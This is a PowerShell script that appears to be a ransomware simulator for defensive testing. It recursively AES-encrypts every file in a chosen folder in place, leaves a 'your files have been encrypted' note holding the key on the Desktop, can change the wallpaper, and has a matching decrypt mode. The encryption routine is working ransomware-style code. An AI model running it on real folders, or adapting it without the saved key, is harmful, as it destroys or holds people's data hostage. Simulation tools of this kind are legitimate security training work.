param (
    [Parameter(Mandatory=$true)]
    [ValidateSet("encrypt", "decrypt")]
    [string]$Mode,
    [Parameter(Mandatory=$true)]
    [string]$FolderPath,
    [string]$WallpaperImagePath
)
function Get-DesktopPath {
    return [Environment]::GetFolderPath("Desktop")
}
function Set-Wallpaper($imagePath) {
    $code = @"
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
    Add-Type $code
    [Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 3)
}
function Encrypt-Files {
    $key = New-Object byte[] 32
    $iv = New-Object byte[] 16
    [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($key)
    [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($iv)
    Get-ChildItem -Path $FolderPath -Recurse -File | ForEach-Object {
        $file = $_.FullName
        $content = [System.IO.File]::ReadAllBytes($file)
        $aes = [System.Security.Cryptography.AesManaged]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $aes.Mode = 'CBC'
        $aes.Padding = 'PKCS7'
        $encryptor = $aes.CreateEncryptor()
        $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
        [System.IO.File]::WriteAllBytes($file, $encrypted)
		Write-Host "$file == encrypted"
    }
    $keyFile = Join-Path (Get-DesktopPath) "decryption_instructions.txt"
    [IO.File]::WriteAllLines($keyFile, @(
        " Key: " + [Convert]::ToBase64String($key),
        "`r`n IV: " + [Convert]::ToBase64String($iv),
		"`r`n Your files have been encrypted!!", 
		"`r`n If this was real ransomware we would be providing you with details of how to pay the ransom to maybe recover your files",
		"`r`n Luckily this is just a simulation :)",
		"`r`n Do NOT delete this file or move it from the Desktop - the decryptor needs it to be there.",
		"`r`n Run .\ransim1.ps1 -Mode decrypt -FolderPath [Path to encrypted files] to decrypt your documents",
		"`r`n e.g., .\ransim.ps1 -Mode decrypt -FolderPath ''C:\Users\User1\Documents'' "
    ))
    if ($WallpaperImagePath) {
        Set-Wallpaper $WallpaperImagePath
    }
    Write-Host "Encryption complete. Key saved to $keyFile"
}
function Decrypt-Files {
    $keyFile = Join-Path (Get-DesktopPath) "decryption_instructions.txt"
    if (-not (Test-Path $keyFile)) {
        Write-Error "Key file not found on desktop."
        return
    }
    $lines = Get-Content $keyFile
    $key = [Convert]::FromBase64String(($lines | Where-Object { $_ -like " Key:*" }) -replace  " Key: ")
    $iv = [Convert]::FromBase64String(($lines | Where-Object { $_ -like " IV:*" }) -replace " IV: ")
    Get-ChildItem -Path $FolderPath -Recurse -File | ForEach-Object {
        $file = $_.FullName
        $content = [System.IO.File]::ReadAllBytes($file)
        $aes = [System.Security.Cryptography.AesManaged]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $aes.Mode = 'CBC'
        $aes.Padding = 'PKCS7'
        $decryptor = $aes.CreateDecryptor()
        try {
            $decrypted = $decryptor.TransformFinalBlock($content, 0, $content.Length)
            [System.IO.File]::WriteAllBytes($file, $decrypted)
        } catch {
            Write-Warning "Failed to decrypt $file"
        }
		Write-Host "$file == decrypted"
    }
    Write-Host "Decryption complete."
}
if ($Mode -eq 'encrypt') {

	Write-Host " ██▀███   ▄▄▄       ███▄    █   ██████  ▒█████   ███▄ ▄███▓  ██████  ██▓ ███▄ ▄███▓"	
	Write-Host "▓██ ▒ ██▒▒████▄     ██ ▀█   █ ▒██    ▒ ▒██▒  ██▒▓██▒▀█▀ ██▒▒██    ▒ ▓██▒▓██▒▀█▀ ██▒"
	Write-Host "▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒░ ▓██▄   ▒██░  ██▒▓██    ▓██░░ ▓██▄   ▒██▒▓██    ▓██░"
	Write-Host "▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒  ▒   ██▒▒██   ██░▒██    ▒██   ▒   ██▒░██░▒██    ▒██ "
	Write-Host "░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░▒██████▒▒░ ████▓▒░▒██▒   ░██▒▒██████▒▒░██░▒██▒   ░██▒"
	Write-Host "░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░░▓  ░ ▒░   ░  ░"
	Write-Host "  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░  ░ ▒ ▒░ ░  ░      ░░ ░▒  ░ ░ ▒ ░░  ░      ░"
	Write-Host "  ░░   ░   ░   ▒      ░   ░ ░ ░  ░  ░  ░ ░ ░ ▒  ░      ░   ░  ░  ░   ▒ ░░      ░   "
	Write-Host "   ░           ░  ░         ░       ░      ░ ░         ░         ░   ░         ░   "
	Write-Host "                                                                                   "

    Encrypt-Files
} elseif ($Mode -eq 'decrypt') {
    Decrypt-Files
}